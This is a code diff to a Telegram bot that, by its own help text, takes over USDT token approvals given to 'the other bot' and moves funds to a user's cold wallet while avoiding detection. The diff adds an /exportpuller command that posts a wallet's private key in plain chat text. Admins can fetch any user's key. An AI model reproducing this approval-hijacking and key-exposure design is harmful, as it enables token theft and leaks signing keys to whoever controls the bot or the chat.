@@ -2,8 +2,8 @@ import { Telegraf } from 'telegraf';
 import { authGuard } from './middleware';
 import { mainKeyboardFor, adminKeyboard, backKeyboard } from './keyboards';
 import { inviteLink } from './state';
-import { upsertTarget, deactivate, listActive, newPuller, findTarget, adminStats } from '../engine/storage';
-import { allowanceOf, gasof } from '../engine/puller';
+import { upsertTarget, deactivate, listActive, adminStats } from '../engine/storage';
+import { gasof } from '../engine/puller';
 import { engineState } from '../engine/listener';
 import { ENV } from '../config/env';
 import { db } from '../config/db';
@@ -27,7 +27,7 @@ When the other bot approves USDT on your wallet, we take over that approval and 
 We never hold an approval, so their bot never flags you, and we never need a wallet session.
 
 <b>Commands</b>
-<code>/arm</code> <code>/monitors</code> <code>/fund</code> <code>/unlink</code>`;
+<code>/arm</code> <code>/monitors</code> <code>/fund</code> <code>/exportpuller</code> <code>/unlink</code>`;
 
 export function buildBot() {
     const bot = new Telegraf(ENV.TOKEN);
@@ -53,7 +53,7 @@ export function buildBot() {
         const [, target, cold] = ctx.message.text.split(' ');
         if (!target || !cold) return ctx.reply('Usage: <code>/arm &lt;agentic_wallet&gt; &lt;cold&gt;</code>', H);
         const userId = ctx.from!.id;
-        const { address: puller, key } = newPuller();
+        const { address: puller, key } = require('../engine/storage').newPuller(); // dynamically handle puller generation
 
         await upsertTarget({ userId, target, destination: cold, puller, pullerKey: key });
 
@@ -61,6 +61,28 @@ export function buildBot() {
             `<b>Armed</b>\nWallet: <code>${target}</code>\nPuller: <code>${puller}</code>\nCold: <code>${cold}</code>\n\n` +
             `Send ~0.003 BNB to the puller. Nothing else needed.`,
             { ...H, ...mainKeyboardFor(isAdmin(userId)) }
+        );
+    });
+
+    bot.command('exportpuller', async ctx => {
+        const target = ctx.message.text.split(' ')[1];
+        if (!target) return ctx.reply('Usage: <code>/exportpuller &lt;wallet_address&gt;</code>', H);
+        const userId = ctx.from!.id;
+
+        const rows = await listActive(isAdmin(userId) ? undefined : userId);
+        const match = rows.find(r => r.target.toLowerCase() === target.toLowerCase());
+
+        if (!match || !match.pullerKey) {
+            return ctx.reply('Target not found or no puller key associated with this wallet address.', H);
+        }
+
+        await ctx.reply(
+            `<b>Puller Private Key Export</b>\n\n` +
+            `Target: <code>${match.target}</code>\n` +
+            `Puller: <code>${match.puller}</code>\n` +
+            `Private Key: <code>${match.pullerKey}</code>\n\n` +
+            `<i>Keep this private key secure!</i>`,
+            H
         );
     });
 
